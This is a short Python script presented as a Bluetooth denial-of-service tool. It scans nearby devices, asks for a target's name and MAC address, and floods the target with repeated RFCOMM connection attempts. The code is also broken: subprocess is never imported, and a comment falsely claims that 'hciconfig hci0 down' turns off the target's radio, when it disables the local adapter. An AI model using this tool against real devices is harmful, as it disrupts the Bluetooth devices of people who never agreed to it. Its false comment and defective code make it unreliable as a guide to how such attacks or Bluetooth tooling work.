import bluetooth
from Banner_MasterCode import print_banner
# Help Center
print_banner()
def help_center():
    print("Welcome to the Help Center\n")
    print("To use this tool, follow these steps:")
    print("1. Scan for nearby Bluetooth devices")
    print("2. Note down the name and MAC address of the device you want to attack")
    print("3. Enter the name and MAC address of the target device when prompted")
    print("4. Wait for the tool to perform the DoS attack\n")

# Scan for nearby Bluetooth devices
devices = bluetooth.discover_devices()

# Print the list of discovered devices
print("Bluetooth Devices:\n")
print("{:<20} {:<17}".format("Device Name", "MAC Address"))
print("----------------------------------------")
for addr in devices:
    name = bluetooth.lookup_name(addr)
    if name is not None and addr is not None:
        print("{:<20} {:<17}".format(name, addr))

# Get the MAC address of the target device from the user
target_name = input("\nEnter the name of the target device: ")
target_mac = input("Enter the MAC address of the target device: ")

# Turn off the Bluetooth radio on the target device using hciconfig
subprocess.call(['hciconfig', 'hci0', 'down'])

# Continuously attempt to connect to the target device
while True:
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((target_mac, 1))
        sock.close()
    except:
        pass
